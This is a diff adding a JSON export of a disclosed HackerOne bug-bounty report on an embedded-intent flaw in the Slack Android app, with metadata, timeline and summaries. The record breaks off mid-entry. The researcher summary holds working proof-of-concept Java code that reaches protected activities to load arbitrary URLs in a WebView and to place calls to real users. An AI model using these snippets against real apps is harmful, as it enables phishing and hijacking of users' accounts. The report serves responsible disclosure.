@@ -1,0 +1,1203 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-06-20T13:41:06.171Z", 
+    "voters": [
+        "bl4de", 
+        "eveeez", 
+        "madrobot", 
+        "axolotl", 
+        "atestpk", 
+        "m7mdharoun", 
+        "japz", 
+        "smit", 
+        "secdoor", 
+        "skyhacker", 
+        "and 1 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "1000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 200427, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-07-17T23:34:55.922Z", 
+    "vulnerability_information": "", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "critical", 
+        "author_type": "User"
+    }, 
+    "title": "Access of Android protected components via embedded intent", 
+    "is_member_of_team?": null, 
+    "vote_count": 11, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 4541, 
+            "content": "@bagipro found a vulnerability wherein a malicious and unprivileged app on the victim's phone could interact with any activity in the Slack Android app, allowing manipulation of the app in unintended ways. Thanks for the finding @bagipro!", 
+            "content_html": "<p><a href=\"/bagipro\">@bagipro</a> found a vulnerability wherein a malicious and unprivileged app on the victim&#39;s phone could interact with any activity in the Slack Android app, allowing manipulation of the app in unintended ways. Thanks for the finding <a href=\"/bagipro\">@bagipro</a>!</p>\n"
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 4529, 
+            "content": "I found the following code inside ```com.Slack.ui.HomeActivity``` (exported activity, it means that any third-party app installed on the device/instant app can access it)\n```java\nprotected void onResume() {\n    // ...\n    handleIntentExtras(getIntent()); // attacker can pass anything to getIntent()\n}\n\nprivate void handleIntentExtras(Intent intent) {\n    // ...\n    Intent deeplinkIntent = (Intent) intent.getParcelableExtra(\"extra_deep_link_intent\");\n    //  ...\n    if (!(deeplinkIntent == null || this.consumedDeeplinkIntent)) {\n        // ...\n        startActivity(deeplinkIntent); // danger! starting an intent provided by an attacker\n        // ...\n    }\n    // ...\n}\n```\nSo we get that ANY protected/not exported activity can be reached.\nHere is an example how it can be used against ```com.Slack.ui.WebViewActivity```, ***opening arbitrary link inside WebView***\n```java\nIntent next = new Intent();\nnext.setClassName(\"com.Slack\", \"com.Slack.ui.WebViewActivity\");\nnext.putExtra(\"extra_url\", \"http://ya.ru\");\nnext.putExtra(\"extra_title\", \"test\");\n\nIntent start = new Intent();\nstart.setClassName(\"com.Slack\", \"com.Slack.ui.HomeActivity\");\nstart.putExtra(\"extra_deep_link_intent\", next);\n\nstartActivity(start);\n```\n\nIt could be used with ```javascript:``` scheme to trigger XSS, or perform fishing attacks (because users don't see real URL, only title provided by attacker)\n\nResult:\n{F154295}\n\n***Making calls to real people***\n```java\nIntent next = new Intent(\"create\");\nnext.setClassName(\"com.Slack\", \"com.Slack.ui.CallActivity\");\nnext.putExtra(\"EXTRA_CALL_NAME\", \"Fake call name\");\nnext.putExtra(\"EXTRA_CALLER_ID\", \"U1RFBBPCP\");\nnext.putExtra(\"EXTRA_CHANNEL_NAME\", \"Fake channel name\");\nnext.putExtra(\"EXTRA_CHANNEL_ID\", \"D2B84FUFQ\");\nnext.putExtra(\"EXTRA_USERS_TO_INVITE\", new ArrayList<String>(Arrays.asList(new String[] { \"U2B81JBAL\" })));\n\nIntent start = new Intent();\nstart.setClassName(\"com.Slack\", \"com.Slack.ui.HomeActivity\");\nstart.putExtra(\"extra_deep_link_intent\", next);\n\nstartActivity(start);\n```\nResult:\n{F157904}\n\nWas able to perform other actions too like show fake comments and content, spoof received files (with social engineering could be used to force users to download any files provided by attacker)", 
+            "content_html": "<p>I found the following code inside <code>com.Slack.ui.HomeActivity</code> (exported activity, it means that any third-party app installed on the device/instant app can access it)</p>\n<pre class=\"highlight java\"><code><span class=\"kd\">protected</span> <span class=\"kt\">void</span> <span class=\"nf\">onResume</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// ...</span>\n    <span class=\"n\">handleIntentExtras</span><span class=\"o\">(</span><span class=\"n\">getIntent</span><span class=\"o\">());</span> <span class=\"c1\">// attacker can pass anything to getIntent()</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"kt\">void</span> <span class=\"nf\">handleIntentExtras</span><span class=\"o\">(</span><span class=\"n\">Intent</span> <span class=\"n\">intent</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// ...</span>\n    <span class=\"n\">Intent</span> <span class=\"n\">deeplinkIntent</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">Intent</span><span class=\"o\">)</span> <span class=\"n\">intent</span><span class=\"o\">.</span><span class=\"na\">getParcelableExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;extra_deep_link_intent&quot;</span><span class=\"o\">);</span>\n    <span class=\"c1\">//  ...</span>\n    <span class=\"k\">if</span> <span class=\"o\">(!(</span><span class=\"n\">deeplinkIntent</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">consumedDeeplinkIntent</span><span class=\"o\">))</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// ...</span>\n        <span class=\"n\">startActivity</span><span class=\"o\">(</span><span class=\"n\">deeplinkIntent</span><span class=\"o\">);</span> <span class=\"c1\">// danger! starting an intent provided by an attacker</span>\n        <span class=\"c1\">// ...</span>\n    <span class=\"o\">}</span>\n    <span class=\"c1\">// ...</span>\n<span class=\"o\">}</span>\n</code></pre>\n<p>So we get that ANY protected/not exported activity can be reached.<br>\nHere is an example how it can be used against <code>com.Slack.ui.WebViewActivity</code>, <strong><em>opening arbitrary link inside WebView</em></strong></p>\n<pre class=\"highlight java\"><code><span class=\"n\">Intent</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Intent</span><span class=\"o\">();</span>\n<span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">setClassName</span><span class=\"o\">(</span><span class=\"s\">&quot;com.Slack&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;com.Slack.ui.WebViewActivity&quot;</span><span class=\"o\">);</span>\n<span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;extra_url&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;http://ya.ru&quot;</span><span class=\"o\">);</span>\n<span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;extra_title&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;test&quot;</span><span class=\"o\">);</span>\n\n<span class=\"n\">Intent</span> <span class=\"n\">start</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Intent</span><span class=\"o\">();</span>\n<span class=\"n\">start</span><span class=\"o\">.</span><span class=\"na\">setClassName</span><span class=\"o\">(</span><span class=\"s\">&quot;com.Slack&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;com.Slack.ui.HomeActivity&quot;</span><span class=\"o\">);</span>\n<span class=\"n\">start</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;extra_deep_link_intent&quot;</span><span class=\"o\">,</span> <span class=\"n\">next</span><span class=\"o\">);</span>\n\n<span class=\"n\">startActivity</span><span class=\"o\">(</span><span class=\"n\">start</span><span class=\"o\">);</span>\n</code></pre>\n<p>It could be used with <code>javascript:</code> scheme to trigger XSS, or perform fishing attacks (because users don&#39;t see real URL, only title provided by attacker)</p>\n\n<p>Result:<br>\n{F154295}</p>\n\n<p><strong><em>Making calls to real people</em></strong></p>\n<pre class=\"highlight java\"><code><span class=\"n\">Intent</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Intent</span><span class=\"o\">(</span><span class=\"s\">&quot;create&quot;</span><span class=\"o\">);</span>\n<span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">setClassName</span><span class=\"o\">(</span><span class=\"s\">&quot;com.Slack&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;com.Slack.ui.CallActivity&quot;</span><span class=\"o\">);</span>\n<span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;EXTRA_CALL_NAME&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;Fake call name&quot;</span><span class=\"o\">);</span>\n<span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;EXTRA_CALLER_ID&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;U1RFBBPCP&quot;</span><span class=\"o\">);</span>\n<span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;EXTRA_CHANNEL_NAME&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;Fake channel name&quot;</span><span class=\"o\">);</span>\n<span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;EXTRA_CHANNEL_ID&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;D2B84FUFQ&quot;</span><span class=\"o\">);</span>\n<span class=\"n\">next</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;EXTRA_USERS_TO_INVITE&quot;</span><span class=\"o\">,</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">&gt;(</span><span class=\"n\">Arrays</span><span class=\"o\">.</span><span class=\"na\">asList</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"o\">{</span> <span class=\"s\">&quot;U2B81JBAL&quot;</span> <span class=\"o\">})));</span>\n\n<span class=\"n\">Intent</span> <span class=\"n\">start</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Intent</span><span class=\"o\">();</span>\n<span class=\"n\">start</span><span class=\"o\">.</span><span class=\"na\">setClassName</span><span class=\"o\">(</span><span class=\"s\">&quot;com.Slack&quot;</span><span class=\"o\">,</span> <span class=\"s\">&quot;com.Slack.ui.HomeActivity&quot;</span><span class=\"o\">);</span>\n<span class=\"n\">start</span><span class=\"o\">.</span><span class=\"na\">putExtra</span><span class=\"o\">(</span><span class=\"s\">&quot;extra_deep_link_intent&quot;</span><span class=\"o\">,</span> <span class=\"n\">next</span><span class=\"o\">);</span>\n\n<span class=\"n\">startActivity</span><span class=\"o\">(</span><span class=\"n\">start</span><span class=\"o\">);</span>\n</code></pre>\n<p>Result:<br>\n{F157904}</p>\n\n<p>Was able to perform other actions too like show fake comments and content, spoof received files (with social engineering could be used to force users to download any files provided by attacker)</p>\n"
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-07-20T13:41:06.230Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$1,000", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-23T20:36:21.576Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-23T20:36:21.576Z", 
+            "actor": {
+                "username": "bugtriage-josh", 
+                "url": "/bugtriage-josh", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugNeedsMoreInfo", 
+            "id": 1439285, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-24T18:52:54.722Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-24T18:52:54.722Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugNew", 
+            "id": 1441665, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-01-27T21:25:03.894Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-01-27T21:25:03.894Z", 
+            "actor": {
+                "username": "bugtriage-josh", 
+                "url": "/bugtriage-josh", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugNeedsMoreInfo", 
+            "id": 1448773, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-06T19:27:42.639Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-06T19:27:42.639Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugNew", 
+            "id": 1466308, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-06T20:24:39.138Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-06T20:24:39.138Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1466558, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-08T06:12:33.911Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-08T06:12:33.911Z", 
+            "actor": {
+                "username": "bugtriage-josh", 
+                "url": "/bugtriage-josh", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1470363, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-08T10:17:34.013Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-08T10:17:34.013Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1470704, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-11T00:37:19.921Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-11T00:37:19.921Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugTriaged", 
+            "id": 1478358, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-07T18:45:38.504Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-07T18:45:38.504Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1524970, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-03-08T05:17:06.905Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-08T05:17:06.905Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1526142, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-18T20:28:22.323Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-18T20:28:22.323Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1619544, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-24T12:30:46.381Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-24T12:30:46.381Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1630367, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-04-27T23:28:28.451Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-04-27T23:28:28.451Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1641507, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-12T11:03:43.696Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-12T11:03:43.696Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1669794, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-15T13:52:29.678Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-15T13:52:29.678Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1674359, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-23T00:32:41.122Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-23T00:32:41.122Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1693499, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-23T09:06:57.478Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-23T09:06:57.478Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1694263, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-23T16:46:50.585Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-23T16:46:50.585Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1695418, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-23T20:08:41.488Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-23T20:08:41.488Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1696035, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-30T22:20:52.802Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-30T22:20:52.802Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1711588, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-31T22:52:15.914Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-31T22:52:15.914Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1718513, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-02T21:31:48.070Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-02T21:31:48.070Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1727220, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-06T07:15:10.686Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-06T07:15:10.686Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1733972, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-06T12:52:21.221Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-06T12:52:47.773Z", 
+            "actor": {
+                "username": "bagipro", 
+                "url": "/bagipro", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/052/239/4b9c2ee7524735b272d88b4365fd11b0c99c3b9a_medium.jpg?1510530490"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::Comment", 
+            "id": 1734607, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bagipro", 
+                "url": "/bagipro"
+            }, 
+            "created_at": "2017-06-06T23:20:06.578Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-06T23:20:06.578Z", 
+            "actor": {
+                "username": "maxfeldman", 
+                "url": "/maxfeldman", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/016/613/f1dc7c1494fc501a1aedb5550f609e966611d0be_medium.png?1430293729"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "slack", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 1736193, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-06-06T23:21:37.027Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-06T23:21:37.027Z", 
+            "actor": {
+                "url": "/slack", 
+                "profile": {
+                    "name": "Slack"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/069/50cfd8e05b18bade214847ec5f61dcb9e6c85fa9_medium.png?1449082084"
+                }
+            }, 
+            "team_handle": "slack", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "650.0", 
+            "collaborator": {
+                "username": "bagipro", 
+                "url": "/bagipro"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1736197, 
